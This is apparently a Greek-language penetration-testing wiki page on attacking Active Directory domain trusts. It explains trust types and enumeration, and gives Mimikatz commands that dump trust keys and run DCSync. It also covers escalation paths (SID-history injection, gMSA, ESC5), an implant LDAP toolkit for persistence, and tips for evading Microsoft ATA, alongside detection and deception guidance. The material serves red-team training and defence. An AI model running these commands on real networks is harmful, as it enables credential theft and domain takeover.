Σε ένα τυπικό σενάριο, αν ένας χρήστης θέλει να αποκτήσει πρόσβαση σε μια υπηρεσία σε ένα **trusted domain**, πρέπει πρώτα να ζητήσει από τον DC του domain του ένα ειδικό ticket, γνωστό ως **inter-realm TGT**. Αυτό το TGT είναι κρυπτογραφημένο με ένα κοινό **key** που έχουν συμφωνήσει και τα δύο domains. Στη συνέχεια, ο χρήστης παρουσιάζει αυτό το TGT στον **DC του trusted domain** για να λάβει ένα service ticket (**TGS**). Αν ο DC του trusted domain επικυρώσει επιτυχώς το inter-realm TGT, εκδίδει ένα TGS, παρέχοντας στον χρήστη πρόσβαση στην υπηρεσία.

**Βήματα**:

1. Ένας **client computer** στο **Domain 1** ξεκινά τη διαδικασία χρησιμοποιώντας το **NTLM hash** του για να ζητήσει ένα **Ticket Granting Ticket (TGT)** από τον **Domain Controller (DC1)** του.
2. Ο DC1 εκδίδει ένα νέο TGT, αν ο client πιστοποιηθεί επιτυχώς.
3. Στη συνέχεια, ο client ζητά από τον DC1 ένα **inter-realm TGT**, το οποίο απαιτείται για την πρόσβαση σε πόρους στο **Domain 2**.
4. Το inter-realm TGT είναι κρυπτογραφημένο με ένα **trust key** που μοιράζονται οι DC1 και DC2 στο πλαίσιο του αμφίδρομου domain trust.
5. Ο client μεταφέρει το inter-realm TGT στον **Domain Controller του Domain 2 (DC2)**.
6. Ο DC2 επαληθεύει το inter-realm TGT χρησιμοποιώντας το κοινό trust key και, αν είναι έγκυρο, εκδίδει ένα **Ticket Granting Service (TGS)** για τον server στο Domain 2 στον οποίο θέλει να αποκτήσει πρόσβαση ο client.
7. Τέλος, ο client παρουσιάζει αυτό το TGS στον server, όπου είναι κρυπτογραφημένο με το hash του λογαριασμού του server, για να αποκτήσει πρόσβαση στην υπηρεσία στο Domain 2.

### Διαφορετικά trusts

Είναι σημαντικό να σημειωθεί ότι **ένα trust μπορεί να είναι μονόδρομο ή αμφίδρομο**. Στην αμφίδρομη περίπτωση, τα δύο domains εμπιστεύονται το ένα το άλλο, αλλά σε μια **μονόδρομη** σχέση trust, το ένα domain είναι το **trusted** και το άλλο το **trusting** domain. Στην τελευταία περίπτωση, **θα μπορείτε να αποκτήσετε πρόσβαση σε πόρους του trusting domain μόνο από το trusted domain**.

Αν το Domain A εμπιστεύεται το Domain B, το A είναι το trusting domain και το B είναι το trusted domain. Επιπλέον, στο **Domain A**, αυτό θα ήταν ένα **Outbound trust**, ενώ στο **Domain B** θα ήταν ένα **Inbound trust**.

**Διαφορετικές σχέσεις trust**

- **Parent-Child Trusts**: Πρόκειται για μια συνηθισμένη ρύθμιση στο ίδιο forest, όπου ένα child domain έχει αυτόματα αμφίδρομο transitive trust με το parent domain του. Ουσιαστικά, αυτό σημαίνει ότι τα αιτήματα πιστοποίησης ταυτότητας μπορούν να ρέουν ομαλά μεταξύ του parent και του child.
- **Cross-link Trusts**: Γνωστά ως "shortcut trusts", δημιουργούνται μεταξύ child domains για να επιταχύνουν τις διαδικασίες referral. Σε σύνθετα forests, τα referrals πιστοποίησης ταυτότητας συνήθως πρέπει να περάσουν από το forest root και μετά να κατευθυνθούν προς το domain-στόχο. Με τη δημιουργία cross-links, η διαδρομή συντομεύεται, κάτι που είναι ιδιαίτερα χρήσιμο σε περιβάλλοντα με γεωγραφική διασπορά.
- **External Trusts**: Δημιουργούνται μεταξύ διαφορετικών, μη συσχετισμένων domains και είναι εξ ορισμού non-transitive. Σύμφωνα με την [τεκμηρίωση της Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), τα external trusts είναι χρήσιμα για την πρόσβαση σε πόρους ενός domain εκτός του τρέχοντος forest, το οποίο δεν συνδέεται μέσω forest trust. Η ασφάλεια ενισχύεται με το SID filtering στα external trusts.
- **Tree-root Trusts**: Αυτά τα trusts δημιουργούνται αυτόματα μεταξύ του forest root domain και ενός νέου tree root που προστίθεται. Αν και δεν συναντώνται συχνά, τα tree-root trusts είναι σημαντικά για την προσθήκη νέων domain trees σε ένα forest, καθώς τους επιτρέπουν να διατηρούν ένα μοναδικό domain name και εξασφαλίζουν αμφίδρομη transitivity. Περισσότερες πληροφορίες υπάρχουν στον [οδηγό της Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Αυτός ο τύπος trust είναι ένα αμφίδρομο transitive trust μεταξύ δύο forest root domains, ενώ εφαρμόζει επίσης SID filtering για την ενίσχυση της ασφάλειας.
- **MIT Trusts**: Αυτά τα trusts δημιουργούνται με Kerberos domains εκτός Windows, συμβατά με το [RFC4120](https://tools.ietf.org/html/rfc4120). Τα MIT trusts είναι πιο εξειδικευμένα και απευθύνονται σε περιβάλλοντα που απαιτούν ενσωμάτωση με συστήματα βασισμένα στο Kerberos εκτός του οικοσυστήματος των Windows.

#### Άλλες διαφορές στις **σχέσεις trust**

- Μια σχέση trust μπορεί επίσης να είναι **transitive** (το A εμπιστεύεται το B, το B εμπιστεύεται το C, άρα το A εμπιστεύεται το C) ή **non-transitive**.
- Μια σχέση trust μπορεί να ρυθμιστεί ως **bidirectional trust** (τα δύο μέρη εμπιστεύονται το ένα το άλλο) ή ως **one-way trust** (το ένα μέρος εμπιστεύεται το άλλο).

### Διαδρομή επίθεσης

1. **Καταγράψτε** τις σχέσεις trust
2. Ελέγξτε αν κάποιο **security principal** (user/group/computer) έχει **πρόσβαση** σε πόρους του **άλλου domain**, ίσως μέσω καταχωρίσεων ACE ή επειδή ανήκει σε ομάδες του άλλου domain. Αναζητήστε **σχέσεις μεταξύ domains** (πιθανότατα γι' αυτό δημιουργήθηκε το trust).
   1. Σε αυτή την περίπτωση, το kerberoast μπορεί να είναι άλλη μία επιλογή.
3. **Παραβιάστε** τους **λογαριασμούς** που μπορούν να χρησιμοποιηθούν για **pivot** μεταξύ domains.

Οι επιτιθέμενοι θα μπορούσαν να αποκτήσουν πρόσβαση σε πόρους άλλου domain μέσω τριών βασικών μηχανισμών:

- **Συμμετοχή σε Local Group**: Principals μπορεί να προστεθούν σε local groups σε μηχανήματα, όπως στην ομάδα “Administrators” ενός server, αποκτώντας σημαντικό έλεγχο πάνω σε αυτόν.
- **Συμμετοχή σε ομάδα ξένου domain**: Principals μπορούν επίσης να είναι μέλη ομάδων στο ξένο domain. Ωστόσο, η αποτελεσματικότητα αυτής της μεθόδου εξαρτάται από τη φύση του trust και το εύρος της ομάδας.
- **Access Control Lists (ACLs)**: Principals μπορεί να καθορίζονται σε μια **ACL**, ιδίως ως οντότητες σε **ACEs** μέσα σε μια **DACL**, παρέχοντάς τους πρόσβαση σε συγκεκριμένους πόρους. Για όσους θέλουν να εμβαθύνουν στον τρόπο λειτουργίας των ACLs, DACLs και ACEs, το whitepaper με τίτλο “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” είναι πολύτιμη πηγή.<sup>[[17]](#references)</sup>

### Εύρεση εξωτερικών χρηστών/ομάδων με δικαιώματα

Μπορείτε να ελέγξετε το **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** για να βρείτε foreign security principals στο domain. Πρόκειται για χρήστες/ομάδες από **εξωτερικό domain/forest**.

Μπορείτε να το ελέγξετε στο **Bloodhound** ή χρησιμοποιώντας το powerview:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Child-to-Parent forest privilege escalation

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

Άλλοι τρόποι απαρίθμησης των domain trusts:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> Υπάρχουν **2 αξιόπιστα κλειδιά**, ένα για _Child --> Parent_ και ένα άλλο για _Parent_ --> _Child_.\
> Μπορείτε να εντοπίσετε αυτό που χρησιμοποιείται από τον τρέχοντα τομέα με:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Κλιμακώστε τα προνόμια σε Enterprise admin στον child/parent domain, καταχρώμενοι το trust με SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Εκμετάλλευση εγγράψιμου Configuration NC

Είναι κρίσιμο να κατανοήσετε πώς μπορεί να γίνει εκμετάλλευση του Configuration Naming Context (NC). Το Configuration NC λειτουργεί ως κεντρικό αποθετήριο δεδομένων διαμόρφωσης σε ολόκληρο το forest σε περιβάλλοντα Active Directory (AD). Αυτά τα δεδομένα αναπαράγονται σε κάθε Domain Controller (DC) του forest, ενώ οι εγγράψιμοι DC διατηρούν εγγράψιμο αντίγραφο του Configuration NC. Για να γίνει αυτή η εκμετάλλευση, απαιτούνται **προνόμια SYSTEM σε έναν DC**, κατά προτίμηση σε child DC.

**Σύνδεση GPO με το root DC site**

Το container Sites του Configuration NC περιλαμβάνει πληροφορίες για τα sites όλων των υπολογιστών που είναι συνδεδεμένοι σε domain μέσα στο AD forest. Με προνόμια SYSTEM σε οποιονδήποτε DC, οι επιτιθέμενοι μπορούν να συνδέσουν GPO με τα root DC sites. Αυτή η ενέργεια μπορεί να θέσει σε κίνδυνο το root domain, μέσω της τροποποίησης των πολιτικών που εφαρμόζονται σε αυτά τα sites.

Για περισσότερες πληροφορίες, μπορείτε να μελετήσετε την έρευνα σχετικά με το [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Παραβίαση οποιουδήποτε gMSA στο forest**

Ένα διάνυσμα επίθεσης είναι η στόχευση προνομιούχων gMSA στο domain. Το KDS Root key, που είναι απαραίτητο για τον υπολογισμό των κωδικών πρόσβασης των gMSA, αποθηκεύεται στο Configuration NC. Με προνόμια SYSTEM σε οποιονδήποτε DC, είναι δυνατό να αποκτήσετε πρόσβαση στο KDS Root key και να υπολογίσετε τους κωδικούς πρόσβασης οποιουδήποτε gMSA σε όλο το forest.

Λεπτομερής ανάλυση και οδηγίες βήμα προς βήμα είναι διαθέσιμες εδώ:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Συμπληρωματική επίθεση μέσω delegated MSA (BadSuccessor – κατάχρηση migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Πρόσθετη εξωτερική έρευνα: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Επίθεση αλλαγής Schema**

Αυτή η μέθοδος απαιτεί υπομονή, καθώς πρέπει να περιμένετε να δημιουργηθούν νέα προνομιούχα αντικείμενα AD. Με προνόμια SYSTEM, ένας επιτιθέμενος μπορεί να τροποποιήσει το AD Schema ώστε να παραχωρήσει σε οποιονδήποτε χρήστη πλήρη έλεγχο όλων των κλάσεων. Αυτό μπορεί να οδηγήσει σε μη εξουσιοδοτημένη πρόσβαση και έλεγχο νεοδημιουργημένων αντικειμένων AD.

Περισσότερες πληροφορίες είναι διαθέσιμες στο [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**Από DA σε EA με ADCS ESC5**

Η ευπάθεια ADCS ESC5 στοχεύει στον έλεγχο αντικειμένων Public Key Infrastructure (PKI), ώστε να δημιουργηθεί ένα certificate template που επιτρέπει την ταυτοποίηση ως οποιοσδήποτε χρήστης στο forest. Επειδή τα αντικείμενα PKI βρίσκονται στο Configuration NC, η παραβίαση ενός εγγράψιμου child DC επιτρέπει την εκτέλεση επιθέσεων ESC5.

Περισσότερες λεπτομέρειες υπάρχουν στο [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> Σε περιπτώσεις όπου δεν υπάρχει ADCS, ο επιτιθέμενος μπορεί να εγκαταστήσει τα απαραίτητα στοιχεία, όπως περιγράφεται στο [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Εξωτερικό Forest Domain - Μονόδρομο (Inbound) ή αμφίδρομο

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

Σε αυτό το σενάριο, **το domain σας είναι έμπιστο** από ένα εξωτερικό domain, το οποίο σας παρέχει **μη προσδιορισμένα δικαιώματα** σε αυτό. Θα πρέπει να εντοπίσετε **ποιοι principals του domain σας έχουν ποια δικαιώματα πρόσβασης στο εξωτερικό domain** και έπειτα να προσπαθήσετε να τα εκμεταλλευτείτε:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Εξωτερικό Forest Domain - Μονόδρομη (Εξερχόμενη)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

Σε αυτό το σενάριο, **το domain σας** **εμπιστεύεται** ορισμένα **privileges** σε principal από **διαφορετικά domains**.

Ωστόσο, όταν ένα **domain είναι έμπιστο** από το domain που το εμπιστεύεται, το έμπιστο domain **δημιουργεί έναν χρήστη** με **προβλέψιμο όνομα**, ο οποίος χρησιμοποιεί ως **password το password εμπιστοσύνης**. Αυτό σημαίνει ότι είναι δυνατό να **αποκτήσετε πρόσβαση σε έναν χρήστη από το domain που εμπιστεύεται**, ώστε να εισέλθετε στο έμπιστο domain, να το απαριθμήσετε και να προσπαθήσετε να κλιμακώσετε περαιτέρω τα privileges:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Ένας άλλος τρόπος παραβίασης του έμπιστου domain είναι να εντοπίσετε ένα [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) που έχει δημιουργηθεί προς την **αντίθετη κατεύθυνση** από το trust μεταξύ των domains (κάτι που δεν είναι πολύ συνηθισμένο).

Ένας άλλος τρόπος παραβίασης του έμπιστου domain είναι να περιμένετε σε ένα μηχάνημα στο οποίο μπορεί να συνδεθεί μέσω **RDP** ένας **χρήστης από το έμπιστο domain**. Έπειτα, ο attacker θα μπορούσε να κάνει inject κώδικα στη διεργασία της RDP session και να **αποκτήσει πρόσβαση στο domain προέλευσης του θύματος** από εκεί.\
Επιπλέον, αν το **θύμα έχει προσαρτήσει τον σκληρό δίσκο του**, ο attacker θα μπορούσε, μέσω της διεργασίας της **RDP session**, να αποθηκεύσει **backdoors** στον **startup folder του σκληρού δίσκου**. Αυτή η τεχνική ονομάζεται **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Μετριασμός της κατάχρησης trust μεταξύ domains

### **SID Filtering:**

- Ο κίνδυνος επιθέσεων που εκμεταλλεύονται το attribute SID history μέσω forest trusts μετριάζεται με το SID Filtering, το οποίο είναι ενεργοποιημένο από προεπιλογή σε όλα τα inter-forest trusts. Αυτό βασίζεται στην παραδοχή ότι τα intra-forest trusts είναι ασφαλή, καθώς η Microsoft θεωρεί ως όριο ασφαλείας το forest και όχι το domain.
- Ωστόσο, υπάρχει ένα μειονέκτημα: το SID filtering μπορεί να διαταράξει εφαρμογές και την πρόσβαση χρηστών, με αποτέλεσμα να απενεργοποιείται περιστασιακά.

### **Selective Authentication:**

- Για τα inter-forest trusts, η χρήση του Selective Authentication διασφαλίζει ότι οι χρήστες των δύο forests δεν αυθεντικοποιούνται αυτόματα. Αντίθετα, απαιτούνται ρητά permissions για να έχουν οι χρήστες πρόσβαση σε domains και servers μέσα στο domain ή το forest που τους εμπιστεύεται.
- Είναι σημαντικό να σημειωθεί ότι αυτά τα μέτρα δεν προστατεύουν από την εκμετάλλευση του εγγράψιμου Configuration Naming Context (NC) ή από επιθέσεις στον trust account.

[**Περισσότερες πληροφορίες για τα domain trusts στο ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Κατάχρηση AD μέσω LDAP από implants στον host

Το [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) υλοποιεί ξανά primitives LDAP τύπου bloodyAD ως x64 Beacon Object Files, τα οποία εκτελούνται εξ ολοκλήρου μέσα σε implant στον host (π.χ. Adaptix C2). Οι operators κάνουν compile το πακέτο με `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, φορτώνουν το `ldap.axs` και έπειτα εκτελούν `ldap <subcommand>` από το beacon. Όλη η κίνηση χρησιμοποιεί το τρέχον security context σύνδεσης μέσω LDAP (389) με signing/sealing ή μέσω LDAPS (636) με αυτόματη εμπιστοσύνη πιστοποιητικού, οπότε δεν απαιτούνται socks proxies ή artifacts στον δίσκο.<sup>[[4]](#references)</sup>

### Απαρίθμηση LDAP από implant

- Τα `get-users`, `get-computers`, `get-groups`, `get-usergroups` και `get-groupmembers` επιλύουν σύντομα ονόματα/διαδρομές OU σε πλήρη DNs και εξάγουν τα αντίστοιχα objects.
- Τα `get-object`, `get-attribute` και `get-domaininfo` ανακτούν αυθαίρετα attributes (συμπεριλαμβανομένων security descriptors), καθώς και metadata του forest/domain από το `rootDSE`.
- Τα `get-uac`, `get-spn`, `get-delegation` και `get-rbcd` εμφανίζουν απευθείας από το LDAP υποψήφιους στόχους για roasting, ρυθμίσεις delegation και υπάρχοντα descriptors [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).
- Τα `get-acl` και `get-writable --detailed` αναλύουν το DACL για να εμφανίσουν trustees, δικαιώματα (GenericAll/WriteDACL/WriteOwner/εγγραφές attributes) και κληρονομικότητα, υποδεικνύοντας άμεσα πιθανούς στόχους για privilege escalation μέσω ACL.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### LDAP primitives εγγραφής για κλιμάκωση προνομίων και persistence

- Τα BOF δημιουργίας αντικειμένων (`add-user`, `add-computer`, `add-group`, `add-ou`) επιτρέπουν στον operator να προετοιμάσει νέους principals ή machine accounts σε OU όπου υπάρχουν δικαιώματα. Τα `add-groupmember`, `set-password`, `add-attribute` και `set-attribute` επιτρέπουν την άμεση κατάληψη στόχων όταν εντοπιστούν δικαιώματα write-property.
- Εντολές που εστιάζουν στα ACL, όπως οι `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` και `add-dcsync`, μετατρέπουν τα δικαιώματα WriteDACL/WriteOwner σε οποιοδήποτε αντικείμενο AD σε επαναφορές κωδικών πρόσβασης, έλεγχο συμμετοχής σε ομάδες ή προνόμια αναπαραγωγής DCSync, χωρίς να αφήνουν τεχνουργήματα PowerShell/ADSI. Τα αντίστοιχα `remove-*` καθαρίζουν τα ACE που προστέθηκαν.

### Delegation, roasting και κατάχρηση Kerberos

- Τα `add-spn`/`set-spn` καθιστούν αμέσως έναν παραβιασμένο χρήστη ευάλωτο σε Kerberoast· το `add-asreproastable` (UAC toggle) τον επισημαίνει ως ευάλωτο σε AS-REP roasting χωρίς να αλλάζει τον κωδικό πρόσβασης.
- Τα delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) τροποποιούν τα `msDS-AllowedToDelegateTo`, τα UAC flags ή το `msDS-AllowedToActOnBehalfOfOtherIdentity` από το beacon, ενεργοποιώντας διαδρομές επίθεσης constrained/unconstrained/RBCD και καταργώντας την ανάγκη για remote PowerShell ή RSAT.

### Εισαγωγή sidHistory, μετακίνηση OU και διαμόρφωση επιφάνειας επίθεσης

- Το `add-sidhistory` εισάγει προνομιούχα SID στο SID history ενός ελεγχόμενου principal (δείτε [Εισαγωγή SID-History](sid-history-injection.md)), παρέχοντας stealthy κληρονομική πρόσβαση εξ ολοκλήρου μέσω LDAP/LDAPS.
- Το `move-object` αλλάζει το DN/OU υπολογιστών ή χρηστών, επιτρέποντας στον attacker να μεταφέρει assets υπό delegated δικαιώματα πριν χρησιμοποιήσει τα `set-password`, `add-groupmember` ή `add-spn`. Δείτε [Μετακίνηση OU και κληρονομημένα δικαιώματα](acl-persistence-abuse/#moving-an-object-into-inherited-ou-permissions) για δικαιώματα μετακίνησης και ελέγχους κληρονομικότητας.
- Οι εντολές αφαίρεσης με αυστηρά καθορισμένο πεδίο εφαρμογής (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` κ.λπ.) επιτρέπουν γρήγορη επαναφορά μετά τη συλλογή credentials ή persistence από τον operator, ελαχιστοποιώντας την τηλεμετρία.

## AD -> Azure και Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Μερικές γενικές άμυνες

[**Μάθετε περισσότερα εδώ σχετικά με την προστασία των credentials.**](../stealing-credentials/credentials-protections.md)

### **Αμυντικά μέτρα για την προστασία credentials**

- **Περιορισμοί Domain Admins**: Συνιστάται να επιτρέπεται στους Domain Admins να συνδέονται μόνο σε Domain Controllers και να αποφεύγεται η χρήση τους σε άλλους hosts.
- **Προνόμια λογαριασμών υπηρεσιών**: Οι υπηρεσίες δεν πρέπει να εκτελούνται με προνόμια Domain Admin (DA), ώστε να διατηρείται η ασφάλεια.
- **Χρονικός περιορισμός προνομίων**: Η διάρκεια εργασιών που απαιτούν προνόμια DA πρέπει να περιορίζεται. Αυτό μπορεί να επιτευχθεί με: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Μετριασμός LDAP relay**: Ελέγξτε τα Event IDs 2889/3074/3075 και, στη συνέχεια, επιβάλετε LDAP signing και LDAPS channel binding στους DCs/clients για να αποκλείσετε απόπειρες LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Fingerprinting δραστηριότητας Impacket σε επίπεδο πρωτοκόλλου

Αν θέλετε να εντοπίζετε συνήθεις τεχνικές AD, **μη βασίζεστε μόνο σε τεχνουργήματα που ελέγχει ο operator**, όπως μετονομασμένα binaries, ονόματα υπηρεσιών, προσωρινά batch files ή διαδρομές εξόδου. Καταγράψτε ως baseline τον τρόπο με τον οποίο νόμιμοι Windows clients δημιουργούν κίνηση [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC και WMI και, στη συνέχεια, αναζητήστε **ιδιομορφίες υλοποίησης** που παραμένουν ακόμη κι αν ο operator τροποποιήσει τα `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` ή `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Υποψήφια χαρακτηριστικά υψηλής βεβαιότητας μεμονωμένα** (αφού επαληθευτούν με βάση το δικό σας baseline):
  - Αυθεντικοποιημένο DCE/RPC με `auth_context_id = 79231 + ctx_id`
  - Padding αυθεντικοποίησης DCE/RPC γεμάτο με `0xff`
  - LDAP Kerberos binds που τοποθετούν ένα raw Kerberos `AP-REQ` απευθείας στο SPNEGO `mechToken`
  - Αιτήματα SMB2/3 negotiate με τιμές `ClientGuid` που μοιάζουν με ASCII
  - WMI `IWbemLevel1Login::NTLMLogin` με το μη τυπικό namespace `//./root/cimv2`
  - Hardcoded τιμές Kerberos nonce
- **Καταλληλότερα ως χαρακτηριστικά συσχέτισης/βαθμολόγησης**:
  - Αραιές ή διπλότυπες λίστες Kerberos etype, ασυνήθιστα/ελλείποντα `PA-DATA` ή σειρά etype σε TGS-REQ που διαφέρει από την εγγενή συμπεριφορά των Windows
  - Μηνύματα NTLM Type 1 χωρίς πληροφορίες έκδοσης ή μηνύματα Type 3 με null ονόματα host
  - Raw NTLMSSP μέσω DCE/RPC αντί για SPNEGO, ελλείποντα DCE/RPC verification trailers ή ασυμφωνίες SPNEGO/Kerberos OID
  - Αρκετά από αυτά τα χαρακτηριστικά από τον ίδιο host/user/session/χρονικό διάστημα αποτελούν πολύ ισχυρότερη ένδειξη από οποιοδήποτε μεμονωμένο, ασθενές πεδίο
- **Χρησιμοποιήστε τα για εμπλουτισμό, όχι ως αυτόνομες ειδοποιήσεις**:
  - Προεπιλεγμένα ονόματα αρχείων, διαδρομές εξόδου, τυχαία ονόματα υπηρεσιών, προσωρινά ονόματα batch, προεπιλεγμένα ονόματα λογαριασμών υπολογιστών και συμβολοσειρές HTTP/WebDAV/RDP/MSSQL ειδικές για εργαλεία
  - Οι operators μπορούν εύκολα να τα αλλάξουν· χρησιμεύουν καλύτερα για να εξηγήσουν γιατί ένα cluster πολλών πρωτοκόλλων είναι ύποπτο
- **Λειτουργικές σημειώσεις**:
  - Ορισμένα από αυτά τα σήματα απαιτούν αποκρυπτογραφημένη κίνηση, [ανάλυση PCAP/Zeek](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW ή ορατότητα από την πλευρά της υπηρεσίας
  - Επαληθεύστε τα σε σχέση με Samba/Linux clients, appliances και παλαιότερο λογισμικό πριν τα αναβαθμίσετε σε ειδοποιήσεις
  - Αναβαθμίστε τις ανιχνεύσεις από εμπλουτισμό -> hunting -> ειδοποίηση καθώς αυξάνεται η βεβαιότητά σας για το baseline

### **Υλοποίηση τεχνικών παραπλάνησης**

- Η υλοποίηση παραπλάνησης περιλαμβάνει τη δημιουργία παγίδων, όπως decoy users ή υπολογιστές, με χαρακτηριστικά όπως κωδικούς πρόσβασης που δεν λήγουν ή ένδειξη Trusted for Delegation. Μια αναλυτική προσέγγιση περιλαμβάνει τη δημιουργία χρηστών με συγκεκριμένα δικαιώματα ή την προσθήκη τους σε ομάδες υψηλών προνομίων.<sup>[[2]](#references)</sup>
- Ένα πρακτικό παράδειγμα είναι η χρήση εργαλείων όπως: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Περισσότερα για την ανάπτυξη τεχνικών παραπλάνησης θα βρείτε στο [Deploy-Deception στο GitHub](https://github.com/samratashok/Deploy-Deception).

### **Εντοπισμός παραπλάνησης**

- **Για αντικείμενα χρηστών**: Ύποπτες ενδείξεις περιλαμβάνουν ασυνήθιστα ObjectSID, αραιές συνδέσεις, ημερομηνίες δημιουργίας και χαμηλό αριθμό αποτυχημένων κωδικών πρόσβασης.
- **Γενικές ενδείξεις**: Η σύγκριση των attributes πιθανών decoy objects με εκείνα γνήσιων αντικειμένων μπορεί να αποκαλύψει ασυνέπειες. Εργαλεία όπως το [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) μπορούν να βοηθήσουν στον εντοπισμό τέτοιων παραπλανήσεων.

### **Παράκαμψη συστημάτων ανίχνευσης**

- **Παράκαμψη ανίχνευσης Microsoft ATA**:
  - **Απαρίθμηση χρηστών**: Αποφύγετε την απαρίθμηση sessions σε Domain Controllers για να αποτρέψετε την ανίχνευση από το ATA.
  - **Προσποίηση ticket**: Η χρήση κλειδιών **aes** για τη δημιουργία ticket βοηθά στην αποφυγή ανίχνευσης, καθώς δεν γίνεται υποβάθμιση σε NTLM.
  - **Επιθέσεις DCSync**: Συνιστάται η εκτέλεσή τους από υπολογιστή που δεν είναι Domain Controller, ώστε να αποφευχθεί η ανίχνευση από το ATA, καθώς η απευθείας εκτέλεση από Domain Controller θα ενεργοποιήσει ειδοποιήσεις.

## References

- [1] [Οδηγός για την επίθεση σε σχέσεις εμπιστοσύνης domain](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Πλαστογράφηση σχέσεων εμπιστοσύνης για παραπλάνηση στο Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Από Domain Admin σε Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [Συλλογή LDAP BOF – In-Memory LDAP Toolkit για εκμετάλλευση του Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Χρήση NTLM hashes ως wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Πειρατές](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Ανάλυση του Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Κατάληψη λογαριασμών Active Directory μέσω Netlogon](https://github.com/rub-softsec/onelogon)
